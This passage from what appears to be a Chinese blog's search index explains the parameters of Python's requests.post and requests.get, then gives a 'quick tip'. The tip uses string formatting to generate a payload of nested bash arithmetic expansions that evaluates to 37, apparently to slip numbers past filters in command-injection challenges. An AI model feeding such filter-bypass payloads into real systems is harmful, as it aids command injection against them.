class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">requests.post(url, data=None, json=None, headers=None, cookies=None, files=None, auth=None, timeout=None, allow_redirects=True, proxies=None, stream=None, verify=None, cert=None, hooks=None)</span><br><span class="line"></span><br><span class="line">data: (可选)</span><br><span class="line">发送到服务器的表单数据。可以是字典、字节串、文件对象，或者一个文件描述符。</span><br><span class="line">示例：</span><br><span class="line">data = &#123;&#x27;key&#x27;: &#x27;value&#x27;&#125;</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">json: (可选)</span><br><span class="line">这是一个将数据以 JSON 格式发送的快捷方式。如果提供了这个参数，requests 会自动将数据编码为 JSON 格式，并设置请求头 Content-Type 为 application/json。</span><br><span class="line">示例：</span><br><span class="line">json_data = &#123;&#x27;name&#x27;: &#x27;Alice&#x27;, &#x27;age&#x27;: 25&#125;</span><br><span class="line">response = requests.post(url, json=json_data)</span><br><span class="line"></span><br><span class="line">headers: (可选)</span><br><span class="line">字典类型的 HTTP 请求头。你可以在请求中添加自定义的 HTTP 头，例如设置 Content-Type，Authorization 等。</span><br><span class="line">示例：</span><br><span class="line">headers = &#123;&#x27;User-Agent&#x27;: &#x27;my-app&#x27;&#125;</span><br><span class="line">response = requests.post(url, headers=headers)</span><br><span class="line"></span><br><span class="line">cookies: (可选)</span><br><span class="line">一个字典，包含要随请求发送的 Cookie 数据。可以指定浏览器会话的 Cookie 或者其他类型的 Cookie。</span><br><span class="line">示例：</span><br><span class="line">cookies = &#123;&#x27;session_id&#x27;: &#x27;abc123&#x27;&#125;</span><br><span class="line">response = requests.post(url, cookies=cookies)</span><br><span class="line"></span><br><span class="line">files: (可选)</span><br><span class="line">用于上传文件。可以使用字典形式，键是表单字段名，值是文件对象（使用 open() 打开的文件）。</span><br><span class="line">示例：</span><br><span class="line">files = &#123;&#x27;file&#x27;: open(&#x27;report.pdf&#x27;, &#x27;rb&#x27;)&#125;</span><br><span class="line">response = requests.post(url, files=files)</span><br><span class="line"></span><br><span class="line">auth: (可选)</span><br><span class="line">用于 HTTP 基本认证的元组（username, password）。如果服务器要求身份验证，这个参数会帮助自动处理认证。</span><br><span class="line">示例：</span><br><span class="line">auth = (&#x27;username&#x27;, &#x27;password&#x27;)</span><br><span class="line">response = requests.post(url, auth=auth)</span><br><span class="line"></span><br><span class="line">timeout: (可选)</span><br><span class="line">请求的超时时间（单位是秒）。这个参数定义了请求等待服务器响应的最长时间。</span><br><span class="line">示例：</span><br><span class="line">response = requests.post(url, timeout=5)  # 5秒超时</span><br><span class="line"></span><br><span class="line">allow_redirects: (可选)</span><br><span class="line">默认为 True。如果设置为 False，请求将不会自动跟随 HTTP 重定向（3xx 状态码）。</span><br><span class="line">示例：</span><br><span class="line">response = requests.post(url, allow_redirects=False)</span><br><span class="line"></span><br><span class="line">proxies: (可选)</span><br><span class="line">用于指定代理服务器的字典。</span><br><span class="line">proxies = &#123;&#x27;http&#x27;: &#x27;http://10.10.1.10:3128&#x27;, &#x27;https&#x27;: &#x27;http://10.10.1.10:1080&#x27;&#125;</span><br><span class="line">response = requests.post(url, proxies=proxies)</span><br><span class="line"></span><br><span class="line">stream: (可选)</span><br><span class="line">默认为 False。如果设置为 True，响应的内容不会立即下载，直到你开始读取它。这对于大文件下载时非常有用。</span><br><span class="line">示例：</span><br><span class="line">response = requests.post(url, stream=True)</span><br><span class="line"></span><br><span class="line">verify: (可选)</span><br><span class="line">默认为 True，表示验证 SSL 证书。如果设置为 False，将不验证 SSL 证书，适用于不受信任的自签名证书。</span><br><span class="line">示例：</span><br><span class="line">response = requests.post(url, verify=False)</span><br><span class="line"></span><br><span class="line">cert: (可选)</span><br><span class="line">用于指定 SSL 证书文件。如果你需要进行客户端证书验证，可以使用该参数。</span><br><span class="line">示例：</span><br><span class="line">response = requests.post(url, cert=(&#x27;cert.pem&#x27;, &#x27;key.pem&#x27;))</span><br><span class="line"></span><br><span class="line">hooks: (可选)</span><br><span class="line">钩子函数，通常用于在请求完成后执行一些自定义操作。例如，可以指定请求的 response 钩子以对响应做后处理。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">requests.get 参数详解</span><br><span class="line">requests.get(url, params=None, headers=None, cookies=None, auth=None, timeout=None, allow_redirects=True, proxies=None, stream=None, verify=None, cert=None, hooks=None)</span><br><span class="line"></span><br><span class="line">params: (可选)</span><br><span class="line">URL 查询参数，可以是字典、元组或字节序列。requests 会自动将其编码为查询字符串并附加到 URL 上。</span><br><span class="line">示例：</span><br><span class="line">params = &#123;&#x27;q&#x27;: &#x27;python&#x27;, &#x27;page&#x27;: 2&#125;</span><br><span class="line">response = requests.get(url, params=params)</span><br></pre></td></tr></table></figure><h3 id="python脚本速写小技巧"><a href="#python脚本速写小技巧" class="headerlink" title="python脚本速写小技巧"></a>python脚本速写小技巧</h3><h5 id="format-占位符"><a href="#format-占位符" class="headerlink" title="format{}占位符"></a>format{}占位符</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">soure_number=<span class="string">&#x27;$((&#123;&#125;))&#x27;</span></span><br><span class="line">add_number=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line">payload=soure_number.<span class="built_in">format</span>(add_number*<span class="number">37</span>)<span class="comment">#这里format函数将会使add_number*37与&#123;&#125;进行替换</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
